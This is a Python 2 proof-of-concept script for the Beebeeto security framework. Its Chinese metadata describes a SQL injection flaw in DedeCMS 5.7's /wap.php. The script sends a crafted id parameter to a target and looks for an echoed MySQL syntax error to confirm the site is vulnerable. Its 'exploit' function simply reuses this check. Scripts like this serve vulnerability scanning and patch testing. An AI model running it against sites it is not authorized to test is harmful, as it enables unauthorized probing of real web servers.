#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0071',
            'name': 'DedeCMS 5.7 /wap.php SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-10-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'DedeCMS',
            'vul_version': ['5.7'],
            'type': 'SQL Injection',
            'tag': ['DedeCMS漏洞', 'SQL注入漏洞', '/wap.php'],
            'desc': 'DedeCMS 5.7 /wap.php 文件sids参数在当action为list时没有合适过滤，导致SQL注入漏洞。',
            'references': ['http://sebug.net/vuldb/ssvid-62607',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = "/wap.php?action=list&id=392%20test"
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "Error page: <font color='red'>/wap.php?action=list&id=392%20test</font>" in content:
            if "Error infos: You have an error in your SQL syntax;" in content:
                if "typeid in(392 test)" in content:
                    args['success'] = True
                    args['poc_ret']['vul_url'] = verify_url
                    return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())